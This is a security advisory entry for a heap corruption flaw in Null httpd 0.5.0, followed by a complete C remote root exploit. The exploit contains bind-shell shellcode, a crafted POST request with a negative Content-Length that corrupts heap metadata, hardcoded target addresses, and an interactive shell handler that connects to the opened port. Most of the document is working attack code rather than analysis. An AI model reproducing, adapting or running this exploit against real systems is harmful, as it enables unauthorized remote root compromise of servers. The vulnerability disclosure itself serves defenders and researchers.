source: http://www.securityfocus.com/bid/6255/info

A heap corruption vulnerability has been discovered in Null httpd. By passing a small content length value to the server and triggering the server to make a second recv() of POST data, it is possible to overrun a buffer.

An attacker may exploit this condition to overwrite arbitrary words in memory through the free() function. This may allow for the execution of arbitrary code.

It should be noted that this vulnerability is similar to the issue described in BID 5774, but requires a slightly different method to trigger.

/*           _ ________            _____                        ______
    __ ___ ____       /____.------  ___/____ _______
         _/    \ _   /\   __.  __//   ___/_    ___.  /_\    /_    |     _/
   ___ ._\    . \  /__  _____/ _    /     \_  |    /__      |   _| slc | _____ _
      - -------\______||--._____\---._______//-|__    //-.___|----._____||
                                               / \   /
                                                   \/
 "If we knew what it was we were doing, it would not be called research, would it?"
 ----------------------------------------------------------------------------------
 Remote Null httpd 0.5.0 root exploit        by eSDee of Netric (www.netric.org|be)
 Full advisory available at: http://www.netric.org/advisories/netric-adv009.txt

*/

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include "getopt.h"

struct {
        char *type;
        unsigned int retloc;
        unsigned int ret;

} targets[] = { /* Thanks tozz ;) */
        { "Null httpd 0.5.0 (Redhat 7.3)", 0x0804f334, 0x0804fbd1 },
        { "Crash         (All platforms)", 0xb0efb0ef, 0xb0efb0ef },
};

char shellcode[] = /* shellcode by R00T-dude (ilja@netric.org) */
        "\xeb\x0a--netric--"
        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\xb1\x06\x51"
        "\xb1\x01\x51\xb1\x02\x51\x8d\x0c\x24\xcd\x80\xb3\x02\xb1\x02\x31"
        "\xc9\x51\x51\x51\x80\xc1\x77\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24"
        "\xb2\x10\x52\x51\x50\x8d\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80"
        "\xb3\x01\x53\x52\x8d\x0c\x24\x31\xc0\xb0\x66\x80\xc3\x03\xcd\x80"
        "\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05\xb0\x66\xcd\x80\x89\xc3"
        "\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41"
        "\x31\xc0\xb0\x3f\xcd\x80\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x31\xc9\x51\x53\x8d\x0c\x24"
        "\x31\xc0\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

int sock;

void shell();
void usage();

void usage(char *prog)
{
        fprintf(stderr,"Usage: %s <-h host> <-t type> [-p port]\n", prog);
        exit(1);
}

void shell()
{
        fd_set  fd_read;

        char buff[1024], *cmd="/bin/uname -a;/usr/bin/id;\n";
        int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);
        while(1) {
                FD_SET(sock,&fd_read);
                FD_SET(0,&fd_read);
                if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
                if( FD_ISSET(sock, &fd_read) ) {
                        if((n=recv(sock,buff,sizeof(buff),0))<0){
                                fprintf(stderr, "EOF\n");
                                exit(2);
                        }
                        if(write(1,buff,n)<0)break;
                }

                if ( FD_ISSET(0, &fd_read) ) {
                        if((n=read(0,buff,sizeof(buff)))<0){
                                fprintf(stderr,"EOF\n");
                                exit(2);
                        }
                        if(send(sock,buff,n,0)<0) break;
                }
                usleep(10);
                }
        fprintf(stderr,"Connection lost.\n\n");
        exit(0);
}

int
openhost(char *host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) sock=-1;
        return sock;
}

int
exploit(char *host, int port, int type)
{
        char sendbuf[500];
        char buffer[377];
        int i=0;

        int sock2;

        sock=openhost(host, port);

        if (sock==-1) {
                fprintf(stderr,"Unable to connect.\n\n");
                exit(1);
        }

        fprintf(stdout, "Attacking (%s) ...\n", host);
        memset(buffer, 0xbf, sizeof(buffer) - 1);

        for(i=0;i<376;i=i+4)
        {
                buffer[i]   = 0xbf; /* must be a valid pointer */
                buffer[i+1] = 0xff;
                buffer[i+2] = 0xb0;
                buffer[i+3] = 0xef;
        }

        memcpy(buffer, shellcode, strlen(shellcode));

        buffer[359] = 0xff; /* prev_size */
        buffer[360] = 0xff;
        buffer[361] = 0xff;
        buffer[362] = 0xff;

        buffer[363] = 0xfc; /* size field */
        buffer[364] = 0xff;
        buffer[365] = 0xff;
        buffer[366] = 0xff;

        buffer[368] = (targets[type - 1].retloc & 0x000000ff); /* FD */
        buffer[369] = (targets[type - 1].retloc & 0x0000ff00) >> 8;
        buffer[370] = (targets[type - 1].retloc & 0x00ff0000) >> 16;
        buffer[371] = (targets[type - 1].retloc & 0xff000000) >> 24;

        buffer[372] = (targets[type - 1].ret & 0x000000ff); /* BK */
        buffer[373] = (targets[type - 1].ret & 0x0000ff00) >> 8;
        buffer[374] = (targets[type - 1].ret & 0x00ff0000) >> 16;
        buffer[375] = (targets[type - 1].ret & 0xff000000) >> 24;

        buffer[376] = 0x0;

        snprintf(sendbuf, sizeof(sendbuf) -1, "POST / HTTP/1.0\n"
                                              "Content-Length: -800\n"
                                              "\n\n%s\n",buffer);

        write(sock, sendbuf, strlen(sendbuf));

        sleep(4);
        close(sock);

        sock=openhost(host, 30464);
        if (sock==-1) {
                fprintf(stderr,"Failed.\n\n");
                exit(1);
        }

        fprintf(stdout, "Exploit successful!\n");
        fprintf(stdout, "------------------------------------------------------------------\n");
        shell(sock);
        close(sock);
        return 0;
}

int
main (int argc,char *argv[])
{
        char host[256];
        int i,opt,type=0,port=80;

        fprintf(stdout,"Null httpd 0.5.0 remote root exploit            by eSDee of Netric\n");
        fprintf(stdout,"--------------------------------------------------(www.netric.org)\n");

        memset(host, 0x0, sizeof(host));

        while((opt=getopt(argc,argv,"h:p:t:")) !=EOF)
        {
                switch(opt)
                {
                        case 'h':
                                strncpy(host, optarg, sizeof(host) - 1);
                                break;
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        return -1;
                                }
                                break;
                        case 't':
                                type=atoi(optarg);
                                if (type == 0 || type > sizeof(targets)/12) {
                                        for(i = 0; i < sizeof(targets)/12; i++)
                                                fprintf(stderr, "%d. %s\t (0x%08x - 0x%08x)\n",
                                                                i + 1,
                                                                targets[i].type,
                                                                targets[i].ret,targets[i].retloc);
                                        fprintf(stderr, "\n");
                                        return -1;
                                }
                                break;
                        default:
                                usage(argv[0]);
                                break;
                }

        }

        if (strlen(host) == 0) usage(argv[0]);

        if (!type) {
                fprintf(stderr, "No target given, use -t0 for a list.\n\n");
                return -1;
        }

        if (exploit(host, port, type) < 0) {
                fprintf(stderr, "Failed.\n\n");
                return -1;
        }

        return 0;
}
